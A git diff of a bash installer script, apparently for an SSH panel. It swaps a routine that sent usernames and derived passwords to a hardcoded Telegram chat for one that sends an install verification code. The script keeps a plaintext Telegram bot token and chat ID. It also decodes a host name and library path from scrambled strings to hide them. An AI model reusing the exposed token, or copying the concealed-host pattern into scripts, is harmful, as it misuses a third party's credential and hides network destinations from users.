@@ -50,16 +50,18 @@ verif_key() {
     }
 }
 
+
+
 # Function to generate random code and send to Telegram handle
 send_code_telegram() {
     local telegram_handle=$1
-    local username=$2
-    local password=$(echo "$username" | sha256sum | base64 | head -c 12)  # Generate random password based on username
-    local message="Username: $username\nPassword: $password"
+    random_code=$(shuf -i 100000-999999 -n 1)  # Generate random 6-digit code
+    expiration_date=$(date -d "+24 hours" +"%Y-%m-%d %H:%M:%S")  # Expiration date is set to 24 hours from now
+    message="Your verification code for installation is: $random_code\nThis code will expire on: $expiration_date"
 
     # Replace YOUR_BOT_TOKEN and YOUR_CHAT_ID with your actual bot token and chat ID
-    local bot_token="6803390472:AAEEX8hpTFhsxbmzU5oiZD4dYCOKxS4-lCE"
-    local chat_id="5989863155"
+    bot_token="6803390472:AAEEX8hpTFhsxbmzU5oiZD4dYCOKxS4-lCE"
+    chat_id="5989863155"
 
     # Send message to Telegram
     curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" -d "chat_id=$chat_id" -d "text=$message" > /dev/null
@@ -91,10 +93,6 @@ if [[ "$user_code" != "$random_code" ]]; then
     exit 1
 fi
 
-# Request username from the client
-echo -n "Enter your desired username: "
-read username
-
 # Variable Initialization
 _lnk=$(echo 'z1:y#x.5s0ul&p4hs$s.0a72d*n-e!v89e032:3r'| sed -e 's/[^a-z.]//ig'| rev)
 _Ink=$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×'|sed -e 's/[^a-z/]//ig')
@@ -123,7 +121,7 @@ display_countdown_timer() {
 }
 
 # Display countdown timer
-display_countdown_timer "$expiration_date"
+    display_countdown_timer "$expiration_date"
 
 # Welcome message
 echo -e "\033[1;31m\033[0m"
